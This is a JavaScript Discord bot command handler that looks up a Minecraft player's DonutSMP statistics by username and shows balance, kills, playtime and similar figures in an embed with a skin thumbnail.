const getDonutStats = require('../../../autosecure/utils/donutapi/getDonutStats');
const { EmbedBuilder } = require('discord.js');
const { getSkinAttachment } = require('../../../autosecure/utils/imageHandler');

function formatCompact(val) {
    if (val === null || val === undefined || val === '') return '0';
    val = String(val).trim();
    if (val.endsWith('K') || val.endsWith('M') || val.endsWith('B') || val.endsWith('T')) {
        return val;
    }
    const num = parseFloat(val.replace(/,/g, ''));
    if (isNaN(num)) return val;
    if (num >= 1000000000000) return (num / 1000000000000).toFixed(2).replace(/\.00$/, '') + 'T';
    if (num >= 1000000000) return (num / 1000000000).toFixed(2).replace(/\.00$/, '') + 'B';
    if (num >= 1000000) return (num / 1000000).toFixed(2).replace(/\.00$/, '') + 'M';
    if (num >= 1000) return (num / 1000).toFixed(2).replace(/\.00$/, '') + 'K';
    return String(num);
}

module.exports = {
    name: "donut2",
    usestatsbutton: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            let mcname = interaction.customId.split("|")[1];
            if (!mcname) {
                const noneEmbed = new EmbedBuilder()
                    .setTitle(`DonutSMP Statistics`)
                    .setDescription('None found')
                    .setColor("#E74C3C");
                return interaction.editReply({ content: null, embeds: [noneEmbed] });
            }

            let donut = await getDonutStats(mcname);
            if (!donut) {
                const noneEmbed = new EmbedBuilder()
                    .setTitle(`${mcname}'s Statistics`)
                    .setDescription('No statistics found for this player on DonutSMP.')
                    .setColor("#E74C3C");
                return interaction.editReply({ content: null, embeds: [noneEmbed] });
            }

            const bal = formatCompact(donut.balance || donut.money || 0);
            const shards = donut.shards ? String(donut.shards) : '0';
            const kills = formatCompact(donut.kills || 0);
            const deaths = donut.deaths ? String(donut.deaths) : '0';
            const playtime = donut.playtime || '0m';
            const placed = formatCompact(donut.blocksPlaced || 0);
            const broken = formatCompact(donut.blocksBroken || 0);
            const mobs = formatCompact(donut.mobsKilled || 0);
            const spent = formatCompact(donut.moneySpent || 0);
            const made = formatCompact(donut.moneyMade || 0);

            const output = [
                `🟢 **Balance:** \`${bal}\``,
                `🔮 **Shards:** \`${shards}\``,
                `🗡️ **Kills:** \`${kills}\``,
                `💀 **Deaths:** \`${deaths}\``,
                `🧭 **Playtime:** \`${playtime}\``,
                `🧱 **Blocks Placed:** \`${placed}\``,
                `🪨 **Blocks Broken:** \`${broken}\``,
                `🧟 **Mobs Killed:** \`${mobs}\``,
                `🪙 **Money Spent (Shop):** \`${spent}\``,
                `✨ **Money Made (Sell):** \`${made}\``
            ].join('\n');

            console.log(`[DONUT_STATS] Generating stats embed for ${mcname}`);
            const skinAttachment = await getSkinAttachment(mcname);
            
            const embed = new EmbedBuilder()
                .setAuthor({ name: `${mcname}'s Statistics` })
                .setDescription(output)
                .setColor("#E74C3C");

            if (skinAttachment && skinAttachment.name) {
                embed.setThumbnail('attachment://' + skinAttachment.name);
            } else {
                embed.setThumbnail(`https://visage.surgeplay.com/bust/${encodeURIComponent(mcname)}.png?y=-40&quality=lossless`);
            }

            const replyOptions = {
                content: null, 
                embeds: [embed]
            };

            if (skinAttachment) {
                replyOptions.files = [skinAttachment];
            }

            console.log(`[DONUT_STATS] Sending stats embed for ${mcname}`);
            await interaction.editReply(replyOptions);

        } catch (error) {
            console.error("Error in donut2 command:", error);
            const noneEmbed = new EmbedBuilder()
                .setTitle(`${interaction.customId.split("|")[1] || "Player"}'s Statistics`)
                .setDescription('None found')
                .setColor("#E74C3C");
            if (interaction.deferred || interaction.replied) {
                await interaction.editReply({ content: null, embeds: [noneEmbed] });
            } else {
                await interaction.reply({ content: 'None', ephemeral: true });
            }
        }
    }
};
